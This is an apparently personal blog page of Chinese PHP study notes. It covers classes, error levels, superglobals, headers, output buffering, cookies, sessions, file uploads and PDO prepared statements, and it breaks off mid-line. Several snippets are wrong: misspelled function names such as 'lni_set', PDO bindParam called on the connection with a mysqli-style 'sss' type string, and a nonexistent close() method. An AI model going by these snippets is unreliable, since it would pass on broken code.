大体同c++：private,public,$this-&gt;</span></span><br><span class="line"><span class="comment"># 定义类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">name</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">var</span> <span class="variable">$para</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">name</span>(<span class="params"></span>)</span>&#123;&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;&#125;;</span><br><span class="line"><span class="comment"># 析构函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化对象</span></span><br><span class="line"><span class="variable">$name</span> = <span class="keyword">new</span> <span class="title function_ invoke__">calss_name</span>();</span><br><span class="line"><span class="comment"># 访问对象</span></span><br><span class="line"><span class="variable">$name</span>-&gt;para;</span><br><span class="line"><span class="variable">$name</span>-&gt;<span class="title function_ invoke__">function_name</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment"># 静态变量常量访问</span></span><br><span class="line"><span class="variable">$name</span>::<span class="title function_ invoke__">function_name</span>();</span><br><span class="line"><span class="comment"># 检测某个对象是否属于某个类</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$name</span> <span class="keyword">instanceof</span> class_name;</span><br></pre></td></tr></table></figure></li><li><p>高级</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 继承</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">name</span> <span class="keyword">extends</span> <span class="title">father</span></span>&#123;&#125;;</span><br><span class="line"><span class="comment"># 多态</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Students</span></span>&#123;&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">jk</span> <span class="keyword">extends</span> <span class="title">Students</span></span>&#123;&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xxs</span> <span class="keyword">extends</span> <span class="title">Students</span></span>&#123;&#125;;</span><br></pre></td></tr></table></figure></li></ul><h3 id="14-错误"><a href="#14-错误" class="headerlink" title="14 错误"></a>14 错误</h3><ul><li><p>错误代号</p><blockquote><p>所有看到的错误代码在PHP中都被定义成了系统常量。（可以直接使用）</p><p>所有以E开头的错误常量（代号）其实都是由一个字节存储，然后每一种错误占据一个对应的位，如果想进行一些错误的控制，可以使用位运算进行操作。</p><ol><li>系统错误：系统内置的错误。</li><li>用户错误：用户在使用自定义错误触发的时候，会使用到的错误代号。（系统不会用到）</li><li>其他错误</li></ol></blockquote></li></ul><div class="table-container"><table><thead><tr><th>系统错误</th><th>错误效果</th></tr></thead><tbody><tr><td>E_PARSE</td><td>编译错误，代码不会执行</td></tr><tr><td>E_ERROR</td><td>fatal error，致命错误，会导致代码不能正确继续执行（出错的位置断掉）</td></tr><tr><td>E_WARNING</td><td>warning，警告错误，不会影响代码执行，但是可能得到意想不到的结果</td></tr><tr><td>E_NOTICE</td><td>notice，通知错误，不会影响代码执行</td></tr><tr><td><strong>用户错误</strong></td><td><strong>错误效果</strong></td></tr><tr><td>E_USER_ERROR</td><td>fatal error</td></tr><tr><td>E_USER_WARNING</td><td>warning</td></tr><tr><td>E_USER_NOTICE</td><td>notice</td></tr><tr><td><strong>其他错误</strong></td><td><strong>错误效果</strong></td></tr><tr><td>E_ALL</td><td>代表着所有从错误（通常在进行错误控制的时候使用比较多），建议在开发过程中（开发环境）使用。</td></tr></tbody></table></div>  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 排除通知级别notice</span></span><br><span class="line">E_ALL &amp; ~E_NOTICE</span><br><span class="line"></span><br><span class="line"><span class="comment">//只要警告和通知</span></span><br><span class="line">E_WARNING | E_NOTICE</span><br></pre></td></tr></table></figure><ul><li><p>抛出错误</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 抛出错误（&#x27;str&#x27;：错误提示，error：抛出错误类型（默认notice））</span></span><br><span class="line"><span class="title function_ invoke__">trigger_error</span>(<span class="string">&#x27;str&#x27;</span>,[error]);</span><br><span class="line"><span class="comment">// 设置错误（func：错误执行函数，error：触发错误）</span></span><br><span class="line"><span class="title function_ invoke__">set_error_handler</span>(error_func,[error]);</span><br><span class="line"><span class="comment">// 错误函数（错误类型，错误提示，错误文件位置，错误行，错误文本）</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">error_func</span>(<span class="params"><span class="variable">$errno</span>,<span class="variable">$errstr</span>,[<span class="variable">$errfile</span>,<span class="variable">$errline</span>, <span class="variable">$errcontext</span>]</span>)</span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    <span class="keyword">if</span>( !( <span class="title function_ invoke__">error_reporting</span>() &amp; <span class="variable">$errno</span> )) <span class="comment">// 当前错误在系统中不存在，无法处理。</span></span><br><span class="line">       <span class="keyword">return</span> <span class="literal">false</span>; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></li><li><p>错误显示设置</p><blockquote><p>哪些错误该显示，以及该如何显示。</p><p>在PHP中，其实有两种方式来设置当前脚本的错误处理。</p></blockquote><ol><li><p>PHP的配置文件</p><ul><li>php.ini文件：全局配置。</li><li>Display_errors：是否显示错误。</li><li>Error_reporting：显示什么级别的错测。</li><li>error_log：错误日志路径。（log_errors：开启错误日志）</li></ul></li><li><p>可以在运行的PHP脚本中去设置（级别比配置文件高）</p><ul><li><p><code>Error_reporting()</code></p><blockquote><p>设置对应的错误显示级别。（没有参数表示当前错误级别）</p></blockquote></li><li><p><code>lniset(&#39;配置文件中的配置项&#39;,配置值);</code></p></li><li><code>lni_set(&#39;error..reporting&#39;,E_ALL);</code></li><li><code>lni_set(&#39;display_errors&#39;,1);</code></li></ul></li></ol></li></ul><h3 id="15-伪类型"><a href="#15-伪类型" class="headerlink" title="15 伪类型"></a>15 伪类型</h3><ul><li>实际不存在的类型，便于学习。<ul><li>Mixed：混合类型。</li><li>Number：数值类型。</li></ul></li></ul><hr><h2 id="三、PHP动态交互"><a href="#三、PHP动态交互" class="headerlink" title="三、PHP动态交互"></a>三、PHP动态交互</h2><h3 id="1-Web交互编程"><a href="#1-Web交互编程" class="headerlink" title="1 Web交互编程"></a>1 Web交互编程</h3><h4 id="1-1-收发数据"><a href="#1-1-收发数据" class="headerlink" title="1.1 收发数据"></a>1.1 收发数据</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获得post数据</span></span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回当前执行脚本的文件名</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>];</span><br><span class="line"><span class="comment">// 返回访问页面使用的请求方法（例如 POST）</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>];</span><br><span class="line"><span class="comment">// 返回当前执行脚本的文件名</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>];</span><br><span class="line"><span class="comment">// 返回浏览当前页面的用户的主机名</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_HOST&#x27;</span>];</span><br><span class="line"><span class="comment">// 返回访问者浏览器信息</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class="line"><span class="comment">// 返回传递的cookie信息</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_COOKIE&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 客户端与服务器握手IP，如果使用代理则会获取到代理IP</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line"><span class="comment">// 代理服务器发送的HTTP头（可伪造）</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>];</span><br><span class="line"><span class="comment">// 用户是在哪个IP使用的代理（可伪造）</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获得环境变量</span></span><br><span class="line"><span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;REMOTE_ADDR&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// @的使用</span></span><br><span class="line">@<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">@会抑制错误消息的输出。表达式前若加上@，表达式出现错误则返回false。</span></span><br><span class="line"><span class="comment">在此处若无@且Get中不存在参数c时则会返回一个未定义变量，有@且Get中不存在参数c返回null*/</span></span><br></pre></td></tr></table></figure><h4 id="1-2-header"><a href="#1-2-header" class="headerlink" title="1.2 header()"></a>1.2 header()</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># header()是向浏览器传一个HTTP响应头信息</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_ invoke__">header</span>(stringmessage[, <span class="keyword">bool</span> replace[, <span class="keyword">int</span> http_response_code]])</span><br><span class="line"><span class="comment"># stringmessage格式：header_name:header_value</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="comment"># 案例</span></span><br><span class="line"><span class="comment"># 1.重定向网页</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="variable">$url</span>=<span class="string">&#x27;http://web.3eol.com.cn&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location:<span class="subst">$url</span>&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.延迟转向</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="comment">//3秒后，跳转到微博</span></span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;refresh:3;url=http://weibo.com&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.设置中文</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/html;charset=utf-8;&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4.强制下载文件</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="variable">$filename</span>=<span class="string">&#x27;test.gif&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:image/gif&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Disposition:attachment; filename=&quot;&#x27;</span>.<span class="variable">$filename</span>.<span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Length:&#x27;</span>.<span class="title function_ invoke__">filesize</span>(<span class="variable">$filename</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="1-3-缓冲发送"><a href="#1-3-缓冲发送" class="headerlink" title="1.3 缓冲发送"></a>1.3 缓冲发送</h4><blockquote><p>没开启缓冲区时，程序执行输出的内容都是直接输出到浏览器的。</p><p>开启后，程序执行输出的内容会先存入缓冲区，之后再根据后续代码或脚本执行完成再发送给浏览器。</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 打开输出缓冲区</span></span><br><span class="line"><span class="title function_ invoke__">ob_start</span>();</span><br><span class="line"><span class="comment"># 返回内部缓冲区的内容</span></span><br><span class="line"><span class="variable">$out</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line"><span class="comment"># 返回内部缓冲区的内容，并关闭缓冲区</span></span><br><span class="line"><span class="variable">$out</span> = <span class="title function_ invoke__">ob_get_clean</span>();</span><br><span class="line"><span class="comment"># 返回内部缓冲区的内容，并关闭缓冲区，再把缓冲区内容立刻输出到客户端</span></span><br><span class="line"><span class="variable">$out</span> = <span class="title function_ invoke__">ob_get_flush</span>();</span><br><span class="line"><span class="comment"># 返回内部缓冲区的长度</span></span><br><span class="line"><span class="variable">$len</span> = <span class="title function_ invoke__">ob_get_length</span>();</span><br><span class="line"><span class="comment"># 删除内部缓冲区的内容，但不关闭缓冲区</span></span><br><span class="line"><span class="title function_ invoke__">ob_clean</span>();</span><br><span class="line"><span class="comment"># 立刻输出内部缓冲区的内容，且不关闭缓冲区</span></span><br><span class="line"><span class="title function_ invoke__">ob_flush</span>();</span><br><span class="line"><span class="comment"># 刷新输出缓冲，将ob_flush输出的内容，以及不在PHP缓冲区的内容全部输出至浏览器</span></span><br><span class="line"><span class="title function_ invoke__">flush</span>();</span><br><span class="line"><span class="comment"># 删除内部缓冲区的内容，并关闭缓冲区</span></span><br><span class="line"><span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line"><span class="comment"># 立刻输出内部缓冲区的内容，且不关闭缓冲区</span></span><br><span class="line"><span class="title function_ invoke__">ob_end_flush</span>();</span><br></pre></td></tr></table></figure><h3 id="2-获得缓存"><a href="#2-获得缓存" class="headerlink" title="2 获得缓存"></a>2 获得缓存</h3><h4 id="2-1-Cookie"><a href="#2-1-Cookie" class="headerlink" title="2.1 Cookie"></a>2.1 Cookie</h4><blockquote><p>cookie是小文本文件。</p><p>小是防止服务器写入巨大的垃圾信息给客户端。</p><p>文本文件是指文件不可执行，防止服务器写入恶意代码给客户端。</p><p><a href="https://www.cnblogs.com/forforever/p/12674056.html">获取来访者IP的方法</a></p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 设置cookie(cookie名，cookie值，过期时间，有效目录，有效域名，是否HTTPS，是否只可http)</span></span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(name, value, expire, path, domain，secure，httponly);</span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;sex&#x27;</span>,<span class="string">&#x27;女&#x27;</span>,<span class="title function_ invoke__">time</span>()+<span class="number">60</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="literal">false</span>，<span class="literal">false</span>)</span><br><span class="line"><span class="comment"># httponly设置为true，则意味着该cookie只能通过HTTP协议来访问，如果httponly设置为false或省略，则该cookie可以被客户端脚本访问，这样易被XSS攻击。</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">// 设置案例</span></span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;username&#x27;</span>,<span class="string">&#x27;admin&#x27;</span>); <span class="comment">// 会话型cookie，浏览器关闭即删除</span></span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;username&#x27;</span>,<span class="string">&#x27;admin&#x27;</span>,<span class="title function_ invoke__">time</span>()+<span class="number">60</span>); <span class="comment">// 长效型cookie，有效期为60秒</span></span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;username&#x27;</span>,<span class="string">&#x27;admin&#x27;</span>,<span class="title function_ invoke__">time</span>()+<span class="number">24</span>*<span class="number">60</span>*<span class="number">60</span>); <span class="comment">// 长效型cookie，有效期为1天</span></span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;user&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">time</span>()-<span class="number">3600</span>); <span class="comment">// 删除cookie</span></span><br></pre></td></tr></table></figure><h4 id="2-2-Session"><a href="#2-2-Session" class="headerlink" title="2.2 Session"></a>2.2 Session</h4><blockquote><p><code>Session</code> 用于存储用户的信息。存储于 <code>Session</code> 中的变量持有单一用户的信息，并且对于一个应用程序中的所有页面都是可用的，用<code>session_id</code>来标识每一个会话。</p></blockquote><ul><li><p>注意事项</p><ol><li>session_start()函数前面不能有任何代码输出到浏览器，最好加在页面头部，或先用ob_start()函数打开输出缓冲区。</li><li>对一个不存在的Session变量赋值，将自动创建该变量。已存在则修改值。</li><li>如果新打开一个浏览器访问同一网页则无法获得Session信息。因为新开一个浏览器相当于一个新的用户在访问。</li><li>只要创建了Session变量，该Session变量就能被网站中的所有页面访问。</li></ol></li><li><p>有效期</p><blockquote><p>默认24分钟（1440秒）</p><p>修改session有效期</p><ol><li>修改<code>php.ini</code>中的默认值，<code>session.gc_maxlifetime=1440;</code></li><li>使用<code>ini_set()</code>方法修改session有效期</li></ol></blockquote></li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// session使用</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>(); <span class="comment">// 开启session</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;session_name&#x27;</span>]=<span class="string">&#x27;&#x27;</span>; <span class="comment">// 设置或获得session</span></span><br><span class="line"><span class="comment">// session_unset()只能删除$_SESSION数组中所有元素，不删除保存文件。session_destroy()只删文件不删数组元素，所以可以配合使用</span></span><br><span class="line"><span class="title function_ invoke__">session_unset</span>();</span><br><span class="line"><span class="title function_ invoke__">session_destroy</span>();</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;location:main.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// session设置</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.save_path&#x27;</span>,<span class="string">&#x27;/tmp/&#x27;</span>); <span class="comment">// 设置保存路径</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.gc_maxlifetime&#x27;</span>,<span class="number">60</span>); <span class="comment">// 保存1min</span></span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="title function_ invoke__">session_name</span>(),<span class="title function_ invoke__">session_id</span>(),<span class="title function_ invoke__">time</span>()+<span class="number">60</span>,<span class="string">&quot;/&quot;</span>); <span class="comment">// 设置会话Cookie的过期时间</span></span><br></pre></td></tr></table></figure><h4 id="2-3-区别"><a href="#2-3-区别" class="headerlink" title="2.3 区别"></a>2.3 区别</h4><ol><li>Cookie限制大小，每个文件不超过4KB，每个站点最多设置20个Cookie。（不同浏览器可能不同）</li><li>Session 仍然要通过 Cookie 实现，因为用户的 Session ID 必须保存在会话的 Cookie 中。</li></ol><div class="table-container"><table><thead><tr><th>相似点</th><th>Session</th><th>Cookie</th></tr></thead><tbody><tr><td>功能</td><td>存储和跟踪特定用户的信息</td><td>存储和跟踪特定用户的信息</td></tr><tr><td>优势</td><td>在整个网站的所有页面都可以访问</td><td>在整个网站的所有页面都可以访问</td></tr><tr><td><strong>不同点</strong></td><td><strong>Session</strong></td><td><strong>Cookie</strong></td></tr><tr><td>建立方式</td><td>每次访问网页时会自动建立Session对象</td><td>需要通过代码建立</td></tr><tr><td>存储位置</td><td>服务器端</td><td>客户端</td></tr><tr><td>应用场合</td><td>记住正在访问的用户信息</td><td>记住曾经访问过的用户信息</td></tr></tbody></table></div><h3 id="3-文件上传"><a href="#3-文件上传" class="headerlink" title="3 文件上传"></a>3 文件上传</h3><blockquote><p>如果表单中有文件上传域，则定义表单时必须设置 <code>enctype=&quot;multipart/form-data&quot;,method=post</code></p><p>如果要限制上传文件的大小，可以在表单中添加一个隐藏域：<code>&lt;input type=&quot;hidden&quot; name=&quot;MAX_FILE_SIZE&quot; value=&quot;10240&quot;&gt;</code>。该隐藏域必须放在文件上传域的前面，否则设置会失效。</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取上传文件的信息</span></span><br><span class="line"><span class="comment">// 文件名（不包括路径）</span></span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;upfile&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="comment">// MIME类型，如image/gif</span></span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;upfile&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line"><span class="comment">// 文件大小，单位是B</span></span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;upfile&#x27;</span>][<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line"><span class="comment">// 上传文件在服务器的临时名（包括路径）</span></span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;upfile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"><span class="comment">// 上传文件的错误号，整数，错误号如下</span></span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;upfile&#x27;</span>][<span class="string">&#x27;error&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 移动文件</span></span><br><span class="line"><span class="comment">// 该函数还会额外确认第一参数上传的文件是否合法</span></span><br><span class="line"><span class="title function_ invoke__">move_uploaded_file</span>(old,<span class="keyword">new</span>)</span><br><span class="line">old:<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 多文件上传和获得</span></span><br><span class="line"><span class="comment">// 上传</span></span><br><span class="line">&lt;form action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;upfile[]&quot;</span> /&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;upfile[]&quot;</span> /&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;up file&quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"><span class="comment">// 获得</span></span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;upfile&#x27;</span>][<span class="string">&#x27;name&#x27;</span>][<span class="number">0</span>]</span><br></pre></td></tr></table></figure><div class="table-container"><table><thead><tr><th>错误号</th><th>说明</th></tr></thead><tbody><tr><td>0</td><td>文件上传成功，没有错误发生</td></tr><tr><td>1</td><td>上传文件的大小超过了 php.ini 中 upload_max_filesize 选项限定的值</td></tr><tr><td>2</td><td>上传文件大小超过了表单隐藏域中 MAX_FILE_SIZE 选项指定的值</td></tr><tr><td>3</td><td>只上传了部分文件，如上传过程中网络中断</td></tr><tr><td>4</td><td>没有上传的文件，如没有选择上传文件就直接单击“上传”按钮</td></tr><tr><td>6</td><td>找不到临时文件夹</td></tr><tr><td>7</td><td>服务器上临时文件写入失败，通常是权限不够</td></tr><tr><td>8</td><td>上传的文件被PHP扩展程序中断</td></tr></tbody></table></div><h3 id="4-访问数据库"><a href="#4-访问数据库" class="headerlink" title="4 访问数据库"></a>4 访问数据库</h3><h4 id="4-1-MySQL数据库"><a href="#4-1-MySQL数据库" class="headerlink" title="4.1 MySQL数据库"></a>4.1 MySQL数据库</h4><blockquote><p>路径：<a href="http://127.0.0.1/phpMyAdmin">http://127.0.0.1/phpMyAdmin</a></p><p>账号密码：root——root</p></blockquote><h4 id="4-2-PDO函数"><a href="#4-2-PDO函数" class="headerlink" title="4.2 PDO函数"></a>4.2 PDO函数</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 连接数据库，初始化pdo</span></span><br><span class="line"><span class="variable">$dsn</span>=<span class="string">&quot;mysql:host=localhost;dbname=guestbook&quot;</span>;</span><br><span class="line"><span class="variable">$db</span>=<span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="variable">$dsn</span>,<span class="variable">$db_username</span>,<span class="variable">$db_password</span>);</span><br><span class="line"><span class="comment">// 数据库连接默认不是长连接，长连接则需要如下设置</span></span><br><span class="line"><span class="variable">$db</span>=<span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="variable">$dsn</span>,<span class="variable">$db_username</span>,<span class="variable">$db_password</span>,<span class="keyword">array</span>(PDO::<span class="variable constant_">ATTR_PERSISTENT</span>=&gt;<span class="literal">true</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// PDO对象的方法</span></span><br><span class="line"><span class="comment">// 执行一条有结果集返回的sql语句，返回结果集PDOStatement对象</span></span><br><span class="line"><span class="variable">$res</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="comment">// 执行一条sql语句，返回所影响的记录数</span></span><br><span class="line"><span class="variable">$res</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">exec</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="comment">// 获取最近一条插入到表中记录的自增的ID值</span></span><br><span class="line"><span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">lastInsertId</span>();</span><br><span class="line"><span class="comment">// 准备要执行的sql，用于执行存储过程等</span></span><br><span class="line"><span class="variable">$res</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// PDOStatement对象的方法（PDO执行结果的返回结果为PDOStatement）</span></span><br><span class="line"><span class="comment">// Mode:PDO::FETCH_ASSOC（关联数组）</span></span><br><span class="line"><span class="comment">// 返回当前指针指向记录并把指针移向下一行，到结果集尾则返回false</span></span><br><span class="line"><span class="variable">$res</span>-&gt;<span class="title function_ invoke__">fetch</span>([<span class="variable">$Mode</span>]);</span><br><span class="line"><span class="comment">// 返回赋有所有行的二维数组，指针指向结果集尾</span></span><br><span class="line"><span class="variable">$res</span>-&gt;<span class="title function_ invoke__">fetchAll</span>([<span class="variable">$Mode</span>]);</span><br><span class="line"><span class="comment">// 返回结果集中下一行某列的值</span></span><br><span class="line"><span class="variable">$res</span>-&gt;<span class="title function_ invoke__">fetchColumn</span>();</span><br><span class="line"><span class="comment">// 设置fetch()或fetchAll()方法结果返回模式，如关联数组、索引数组等</span></span><br><span class="line"><span class="variable">$res</span>-&gt;<span class="title function_ invoke__">setFetchMode</span>(<span class="variable">$Mode</span>);</span><br><span class="line"><span class="comment">// 返回结果集的记录总数，仅对query()和prepare()有效</span></span><br><span class="line"><span class="variable">$res</span>-&gt;<span class="title function_ invoke__">rowCount</span>();</span><br><span class="line"><span class="comment">// 返回结果集列总数</span></span><br><span class="line"><span class="variable">$res</span>-&gt;<span class="title function_ invoke__">columnCount</span>();</span><br><span class="line"><span class="comment">// 将一个列和一个指定的变量名绑定（必须设置fetch()方法为FETCH_BOTH）</span></span><br><span class="line"><span class="variable">$res</span>-&gt;<span class="title function_ invoke__">bindColumn</span>();</span><br><span class="line"><span class="comment">// 执行准备好的sql语句，可以对准备的语句中的参数用索引数组赋值，如$para_arr= array(&#x27;:title&#x27;=&gt;&#x27;标题&#x27;,...)</span></span><br><span class="line"><span class="variable">$res</span>-&gt;<span class="title function_ invoke__">execute</span>([<span class="variable">$para_arr</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 抛出PDO异常</span></span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">PDOException</span>(<span class="string">&#x27;tip&#x27;</span>);</span><br><span class="line"><span class="comment">// 关闭连接</span></span><br><span class="line"><span class="variable">$db</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br></pre></td></tr></table></figure><h4 id="4-3-防止sql注入查询"><a href="#4-3-防止sql注入查询" class="headerlink" title="4.3 防止sql注入查询"></a>4.3 防止sql注入查询</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1.占位符占位（任意选一种）</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;insert into lyb(title,content,author) values(?,?,?)&quot;</span>;</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;insert into lyb(title,content,author) values(:title,:content,:author)&quot;</span>;</span><br><span class="line"><span class="comment">// 2.准备</span></span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="comment">// 3.绑定参数</span></span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">bindParam</span>(<span class="number">1</span>,<span class="variable">$title</span>); <span class="comment">//绑定第一个?</span></span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">bindParam</span>(<span class="string">&#x27;:title&#x27;</span>,<span class="variable">$title</span>);</span><br><span class="line"><span class="comment">// 按类型绑定?占位，i:int,d:double,s:string,b:bool。</span></span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">bindParam</span>(<span class="string">&#x27;sss&#x27;</span>,<span class="variable">$title</span>,<span class="variable">$content</span>,<span class="variable">$author</span>);</span><br><span class="line"><span class="comment">// 4.执行</span></span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line"><span class="comment">// 也可以在查询时直接绑定（一次性绑定所有参数）</span></span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>(<span class="keyword">array</span>(<span class="string">&#x27;POD预处理&#x27;</span>,<span class="string">&#x27;插入记录&#x27;</span>,<span 